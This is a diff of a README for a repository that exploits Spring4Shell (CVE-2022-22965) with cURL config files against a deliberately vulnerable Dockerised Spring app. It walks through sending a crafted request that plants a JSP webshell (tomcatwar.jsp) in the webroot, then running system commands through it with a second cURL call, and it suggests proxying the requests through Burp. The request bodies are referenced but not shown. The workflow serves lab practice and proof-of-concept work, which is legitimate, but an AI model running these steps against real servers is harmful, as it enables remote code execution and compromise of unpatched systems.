@@ -1,26 +1,37 @@
 # Spring4Shell-cURL
-cURL configs for exploiting Spring4Shell 
+Weaponzing cURL configs to exploit Spring4Shell (CVE-2022-22965)
 
 
-## Weaponzing cURL to Exploit Spring4Shell (CVE-2022-22965) 
-I hadn't seen this method posted anywhere, just wanted to document. 99% of this is not my work. I just combined unique aspects into this repo. 
+## cURL? Really?
+Yup. I hadn't seen this method posted anywhere, so just wanted to document. Most of the heavy lifting had already been done, I just uniquely combined things with my own twist into this repo. 
 
 
 ### Quick Setup
 
-0. Clone the repo. You'll need Docker and cURL. If somehow you don't have cURL, download from: [https://everything.curl.dev/get](https://everything.curl.dev/get)
-1. Deploy Docker container:  
-`docker image build -t retro/stupidrumor . && docker container run -it --publish 8080:8080 retro/stupidrumor`.
-3. Issue the cURL command:  
-`curl --config request.txt http://localhost:8080/stupidRumor_war/index`. This cURL command first reads from the `requests.txt` file. Inside the `request.txt` are things like the specific headers we need to exploit the vulnerable application. Noteably, the last line is `data-binary = "@body.txt"`, which contains our POST body. 
-   
-   **Note:** I've configured cURL to also send our requests through a transparent application proxy (Burp) in this case on `port 8081`, not `8080` as that's already taken by the Docker app. This is mostly for troubleshooting, but good to have in your Repeater nonetheless :)
-   
-3. Once the cURL command is sent, the webshell (`tomcatwar.jsp`) will be uploaded to the webroot (`stupidRumor_war/`), which means you can access it here in a browser if you want: `stupidRumor_war/tomcatwar.jsp?`
-4. But we're using cURL, so now issue the second cURL request:  
-`curl 'http://localhost:8080/stupidRumor_war/tomcatwar.jsp?pwd=j&cmd=whoami' --output -`. 
+1. Clone the repo. You'll need Docker and cURL.
 
+2. Deploy the Docker container:  
 
+```
+docker image build -t retro/stupidrumor . && docker container run -it --publish 8080:8080 retro/stupidrumor
+```
+
+3. Use cURL to upload your WAR. The following command will read from the local `requests.txt` file. The `request.txt` contains request configurations we want cURL to use, namely the specific headers we need to exploit the vulnerable application. You'll notice the last line `data-binary = "@body.txt"` too, which is our POST body:
+
+```
+curl --config request.txt http://localhost:8080/stupidRumor_war/index
+``` 
+   
+**Note:** I've included proxy support within the cURL configs, so we can send our requests through a transparent application proxy (Burp). This happens over port 8081, so make sure to adjust your proxy details as necessary. This is mostly for troubleshooting, but handy to have in your Repeater nonetheless :)
+   
+4. Once the cURL command is sent, the webshell (`tomcatwar.jsp`) will be uploaded to the webroot (`stupidRumor_war/`), which means you can access it here in a browser if you want: `stupidRumor_war/tomcatwar.jsp?`
+
+5. But we're using cURL, so now issue the second cURL request:  
+```
+curl 'http://localhost:8080/stupidRumor_war/tomcatwar.jsp?pwd=j&cmd=whoami' --output -
+``` 
+
+## In Action
    
 ![image](https://user-images.githubusercontent.com/13237617/161151879-3cf326ad-6610-4bfe-992d-1d03279e6da5.png)
 
